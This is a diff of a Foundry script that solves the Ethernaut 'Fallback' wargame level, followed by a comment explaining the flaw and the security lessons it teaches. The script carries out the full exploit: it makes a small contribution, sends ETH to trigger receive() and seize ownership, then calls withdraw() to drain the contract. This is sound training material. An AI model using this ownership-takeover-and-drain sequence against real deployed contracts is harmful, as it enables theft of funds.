@@ -1,80 +1,83 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.13;
 
-import "../DeployedSolver.s.sol";
+import "ethernaut/levels/Fallback.sol";
+import "forge-std/Script.sol";
+import "forge-std/console.sol";
 
 /**
  * @title FallbackSolver
- * @notice Script to solve the deployed Fallback challenge
+ * @notice Simple script to solve the Fallback challenge
  * @dev Run with `forge script script/solutions/FallbackSolver.s.sol --rpc-url $RPC_URL --private-key $PRIVATE_KEY --broadcast`
  */
-contract FallbackSolver is DeployedSolverBase {
-    address payable public fallbackContract;
-    
-    function setUp() public override {
-        super.setUp();
-        
-        // Get the deployed instance address
-        address instanceAddress = vm.envAddress("FALLBACK_ADDRESS");
-        fallbackContract = payable(instanceAddress);
-        
-        console.log("Fallback contract address:", address(fallbackContract));
-        
-        // Get the current owner
-        bytes memory ownerCall = abi.encodeWithSignature("owner()");
-        (, bytes memory data) = fallbackContract.staticcall(ownerCall);
-        address owner = abi.decode(data, (address));
-        
-        console.log("Initial owner:", owner);
-        console.log("Player address:", playerAddress);
+contract FallbackSolver is Script {
+    // Instance address - replace with your own if needed
+    Fallback public fallbackInstance = Fallback(payable(0x982B5F7388eA04b1c47627cCd20FA437D0A5814e));
+
+    function setUp() public {
     }
-    
+
     function run() public {
-        // Make sure we have enough ETH
-        require(playerAddress.balance > 0, "Not enough ETH in player account");
+        // Get player address from private key
+        uint256 privateKey = vm.envUint("PRIVATE_KEY");
+        address player = vm.addr(privateKey);
         
-        // Step 1: Get initial contribution
-        bytes memory getContribCall = abi.encodeWithSignature("getContribution()");
-        (bool getSuccess, bytes memory contribData) = fallbackContract.staticcall(getContribCall);
-        uint256 initialContribution = abi.decode(contribData, (uint256));
-        console.log("Initial contribution:", initialContribution);
+        console.log("Fallback instance address:", address(fallbackInstance));
+        console.log("Player address:", player);
         
-        // Step 2: Contribute a small amount to get listed in contributions
-        console.log("Step 1: Contributing a small amount...");
-        bytes memory contributeCall = abi.encodeWithSignature("contribute()");
-        (bool contribSuccess,) = fallbackContract.call{value: 0.0001 ether}(contributeCall);
-        require(contribSuccess, "Contribution failed");
+        vm.startBroadcast(privateKey);
+
+        // Step 1: Contribute to get foothold
+        console.log("Step 1: Contributing to get listed in contributions...");
+        fallbackInstance.contribute{value: 0.0001 ether}();
         
-        // Verify contribution was recorded
-        (getSuccess, contribData) = fallbackContract.staticcall(getContribCall);
-        uint256 newContribution = abi.decode(contribData, (uint256));
-        console.log("New contribution:", newContribution);
+        // Step 2: Trigger receive function to become owner
+        console.log("Step 2: Triggering receive function to take ownership...");
+        (bool success,) = address(fallbackInstance).call{value: 0.0001 ether}("");
+        require(success, "Receive call failed");
         
-        // Step 3: Trigger the receive function to become owner
-        console.log("Step 2: Triggering receive function...");
-        (bool receiveSuccess,) = fallbackContract.call{value: 0.0001 ether}("");
-        require(receiveSuccess, "Receive call failed");
+        // Step 3: Verify player is now the owner
+        console.log("New owner:", fallbackInstance.owner());
         
-        // Step 4: Verify player is now the owner
-        bytes memory ownerCall = abi.encodeWithSignature("owner()");
-        (, bytes memory ownerData) = fallbackContract.staticcall(ownerCall);
-        address newOwner = abi.decode(ownerData, (address));
-        console.log("New owner:", newOwner);
-        require(newOwner == playerAddress, "Player is not the owner");
+        // Step 4: Withdraw all funds
+        console.log("Step 4: Withdrawing all funds...");
+        fallbackInstance.withdraw();
         
-        // Step 5: Withdraw all funds
-        console.log("Step 3: Withdrawing all funds...");
-        uint256 balanceBefore = address(fallbackContract).balance;
-        bytes memory withdrawCall = abi.encodeWithSignature("withdraw()");
-        (bool withdrawSuccess,) = fallbackContract.call(withdrawCall);
-        require(withdrawSuccess, "Withdraw failed");
+        console.log("Challenge completed successfully!");
         
-        // Step 6: Verify the contract balance is 0
-        uint256 balanceAfter = address(fallbackContract).balance;
-        console.log("Balance before:", balanceBefore);
-        console.log("Balance after:", balanceAfter);
-        require(balanceAfter == 0, "Contract still has funds");
-        
-        logSuccess();
+        vm.stopBroadcast();
     }
-} 
+}
+
+/*
+ * VULNERABILITY EXPLANATION
+ * -----------------------
+ * The Fallback contract contains a critical authorization flaw in its `receive()` function:
+ *
+ * ```solidity
+ * receive() external payable {
+ *     require(msg.value > 0 && contributions[msg.sender] > 0);
+ *     owner = msg.sender;
+ * }
+ * ```
+ *
+ * This function grants ownership with minimal requirements - just having made any previous 
+ * contribution and sending some ETH - bypassing the expected ownership transfer path.
+ *
+ * EXPLOIT TECHNIQUE
+ * -----------------------
+ * 1. Call `contribute()` with a small amount of ETH (<0.001) to get listed in contributions mapping
+ * 2. Send ETH directly to the contract address to trigger `receive()`
+ * 3. Ownership is transferred to the attacker
+ * 4. Call `withdraw()` to drain the funds
+ *
+ * SECURITY LESSONS
+ * -----------------------
+ * Special functions like `receive()` create alternative entry points that may bypass a contract's 
+ * intended authorization flow. While the contract appears to require substantial contributions 
+ * (>1000 ETH) to become owner, the `receive()` function provides an overlooked shortcut.
+ *
+ * Always audit all execution paths in your contract, with particular attention to fallback functions
+ * that can be triggered through direct ETH transfers. Access control should be consistent across
+ * all functions that modify critical state variables like ownership.
+ */ 
